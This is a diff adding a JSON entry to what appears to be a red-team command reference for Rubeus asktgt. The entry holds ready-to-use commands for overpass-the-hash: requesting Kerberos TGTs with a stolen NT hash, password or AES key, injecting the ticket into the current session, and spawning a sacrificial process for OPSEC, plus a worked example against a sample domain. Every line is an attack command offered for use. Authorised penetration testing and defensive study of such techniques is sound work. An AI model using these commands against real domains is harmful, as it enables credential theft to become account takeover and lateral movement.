@@ -1,0 +1,19 @@
+{
+  "id": "rubeus-asktgt",
+  "name": "Rubeus asktgt",
+  "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /nowrap",
+  "description": "Request a TGT for a user with a password, NT hash, or AES key. /ptt injects it into the current session; /createnetonly spawns a sacrificial process. The Rubeus equivalent of getTGT.py.",
+  "platform": "windows",
+  "requires": ["hash"],
+  "protocols": ["kerberos"],
+  "tags": ["rubeus", "asktgt", "tgt", "overpass-the-hash"],
+  "variations": [
+    { "label": "Password Auth", "requires": "password", "command": "Rubeus.exe asktgt /user:<user> /password:<password> /domain:<domain> /nowrap" },
+    { "label": "AES256", "requires": "aes-key", "command": "Rubeus.exe asktgt /user:<user> /aes256:<aes-key> /domain:<domain> /nowrap" },
+    { "label": "Inject Ticket", "requires": "hash", "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /ptt" },
+    { "label": "OPSEC Sacrificial Process", "requires": "hash", "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /createnetonly:C:\\Windows\\System32\\cmd.exe" }
+  ],
+  "examples": [
+    "Rubeus.exe asktgt /user:jdoe /rc4:abcd1234... /domain:corp.local /ptt"
+  ]
+}
